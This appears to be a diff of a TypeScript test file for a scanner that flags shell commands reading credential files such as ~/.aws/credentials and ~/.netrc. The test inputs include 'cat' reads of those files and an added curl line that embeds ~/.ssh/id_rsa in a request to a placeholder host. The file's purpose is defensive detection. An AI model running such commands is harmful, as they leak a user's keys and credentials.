@@ -2,15 +2,15 @@ import { expect, test } from "bun:test";
 import { credentialPaths } from "./credential-paths.ts";
 import { shellStatements } from "./shell.ts";
 
-const plain = { afterProhibition: () => false, demoted: () => false };
+const noProseContext = { afterProhibition: () => false, demoted: () => false };
 
 const inScript = (...lines: string[]) =>
-  credentialPaths(shellStatements(lines.join("\n"), false), plain);
+  credentialPaths(shellStatements(lines.join("\n"), false), noProseContext);
 
-const inMarkdown = (text: string, context = plain) =>
+const inMarkdown = (text: string, context = noProseContext) =>
   credentialPaths(shellStatements(text, true), context);
 
-test("every home spelling names the same store", () => {
+test("every home spelling names the same credential file", () => {
   for (const spelling of ["$HOME", "${HOME}", "/home/ada", "%USERPROFILE%", "C:\\Users\\ada"]) {
     expect(inScript(`cat ${spelling}/.aws/credentials`)?.detail).toBe("~/.aws/credentials");
   }
@@ -31,7 +31,7 @@ test("a script comment is read as prose", () => {
 });
 
 test("demoted prose drops one level, and the strongest match is reported with the count", () => {
-  expect(inMarkdown("Run `cat ~/.netrc`.", { ...plain, demoted: () => true })).toEqual({
+  expect(inMarkdown("Run `cat ~/.netrc`.", { ...noProseContext, demoted: () => true })).toEqual({
     severity: "warn",
     line: 1,
     detail: "~/.netrc",
@@ -43,6 +43,7 @@ test("demoted prose drops one level, and the strongest match is reported with th
   });
 });
 
-test("a store inside a URL is not a path", () => {
+test("a credential path inside a URL is not a path, unless a substitution reads it", () => {
   expect(inScript("curl https://host.dev/home/ada/.aws/credentials")).toBeUndefined();
+  expect(inScript('curl "https://x.invalid/c?d=$(<~/.ssh/id_rsa)"')?.severity).toBe("critical");
 });
